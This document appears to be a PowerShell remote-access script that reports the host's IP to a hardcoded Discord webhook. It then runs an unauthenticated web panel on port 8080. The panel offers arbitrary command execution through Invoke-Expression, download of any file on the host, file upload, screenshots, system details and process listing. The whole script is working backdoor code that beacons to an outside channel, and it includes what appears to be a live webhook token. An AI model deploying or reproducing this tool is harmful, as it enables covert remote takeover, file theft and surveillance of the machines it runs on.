# Remote Web Control Server
$webhook = "https://discord.com/api/webhooks/1462081265049010260/AdSpBnjtYKQFRI8lKt5oWg--qFCfwKF0b3q552oELMVzFxFDIdV0vUsGkEWWVSmuBLy0"
$port = 8080

# Get local IP
$localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias (Get-NetRoute -Destination 0.0.0.0/0).InterfaceAlias).IPAddress[0]

# Send IP info to Discord
$body = @{content="Web server started on: http://$localIP`:$port"} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"

# HTML Interface
$html = @"
<!DOCTYPE html>
<html>
<head>
    <title>Remote Control Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #fff; }
        .container { max-width: 800px; margin: 0 auto; }
        .section { background: #2d2d2d; padding: 20px; margin: 10px 0; border-radius: 5px; }
        input, textarea, button { width: 100%; padding: 10px; margin: 5px 0; border: none; border-radius: 3px; }
        input, textarea { background: #404040; color: #fff; border: 1px solid #555; }
        button { background: #4CAF50; color: white; cursor: pointer; }
        button:hover { background: #45a049; }
        .output { background: #000; padding: 10px; margin: 10px 0; border-radius: 3px; font-family: monospace; white-space: pre-wrap; }
        .file-upload { border: 2px dashed #555; padding: 20px; margin: 10px 0; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖥️ Remote Control Panel</h1>
        
        <div class="section">
            <h3>💻 Command Terminal</h3>
            <form action="/cmd" method="post">
                <input type="text" name="command" placeholder="Enter PowerShell command..." required>
                <button type="submit">Execute</button>
            </form>
        </div>

        <div class="section">
            <h3>📁 File Manager</h3>
            <form action="/upload" method="post" enctype="multipart/form-data">
                <div class="file-upload">
                    <input type="file" name="file" required>
                    <button type="submit">Upload File</button>
                </div>
            </form>
            <form action="/download" method="post">
                <input type="text" name="filepath" placeholder="Enter file path to download..." required>
                <button type="submit">Download File</button>
            </form>
        </div>

        <div class="section">
            <h3>📸 Actions</h3>
            <form action="/screenshot" method="post">
                <button type="submit">📸 Take Screenshot</button>
            </form>
            <form action="/info" method="post">
                <button type="submit">ℹ️ System Info</button>
            </form>
            <form action="/processes" method="post">
                <button type="submit">⚙️ List Processes</button>
            </form>
        </div>

        <div class="output" id="output">Welcome to Remote Control Panel</div>
    </div>

    <script>
        // Auto-refresh output
        setInterval(function() {
            fetch('/output')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('output').innerHTML = data;
                });
        }, 2000);
    </script>
</body>
</html>
"@

# HTTP Server
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:$port/")
$listener.Start()

$outputBuffer = ""

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response

    try {
        switch ($request.Url.LocalPath) {
            "/" {
                $response.ContentType = "text/html"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            "/cmd" {
                if ($request.HttpMethod -eq "POST") {
                    $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
                    $command = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
                    
                    try {
                        $result = Invoke-Expression $command | Out-String
                        $outputBuffer = "Command: $command`n`nResult:`n$result`n"
                    } catch {
                        $outputBuffer = "Error executing command: $_`n"
                    }
                    
                    $outputBuffer += $outputBuffer
                    $response.ContentType = "text/plain"
                    $buffer = [System.Text.Encoding]::UTF8.GetBytes("Command executed")
                    $response.ContentLength64 = $buffer.Length
                    $response.OutputStream.Write($buffer, 0, $buffer.Length)
                }
            }
            
            "/upload" {
                if ($request.HttpMethod -eq "POST") {
                    $files = $request.Files
                    foreach ($file in $files) {
                        $filePath = "C:\temp\" + $file.FileName
                        $file.SaveAs($filePath)
                        $outputBuffer += "File uploaded: $filePath`n"
                    }
                }
            }
            
            "/download" {
                if ($request.HttpMethod -eq "POST") {
                    $body = New-Object System.IO.StreamReader($request.InputStream).ReadToEnd()
                    $filepath = [System.Web.HttpUtility]::UrlDecode($body.Split('=')[1])
                    if (Test-Path $filepath) {
                        $response.ContentType = "application/octet-stream"
                        $response.AddHeader("Content-Disposition", "attachment; filename=$(Split-Path $filepath -Leaf)")
                        $buffer = [System.IO.File]::ReadAllBytes($filepath)
                        $response.ContentLength64 = $buffer.Length
                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
                    }
                }
            }
            
            "/screenshot" {
                try {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                    $screenshotPath = "C:\temp\screenshot.png"
                    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
                    $outputBuffer += "Screenshot saved: $screenshotPath`n"
                } catch {
                    $outputBuffer += "Screenshot failed: $_`n"
                }
            }
            
            "/info" {
                $info = @"
System Information:
Computer: $env:COMPUTERNAME
User: $env:USERNAME
OS: $(Get-WmiObject -Class Win32_OperatingSystem).Caption
IP: $localIP
"@
                $outputBuffer += $info
            }
            
            "/processes" {
                $processes = Get-Process | Select-Object Name, Id, CPU | ConvertTo-Html -Fragment
                $outputBuffer += "Running Processes:`n$processes`n"
            }
            
            "/output" {
                $response.ContentType = "text/plain"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($outputBuffer)
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
        }
    } catch {
        $response.ContentType = "text/plain"
        $buffer = [System.Text.Encoding]::UTF8.GetBytes("Error: $_")
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
    }
    
    $response.Close()
}

$listener.Stop()
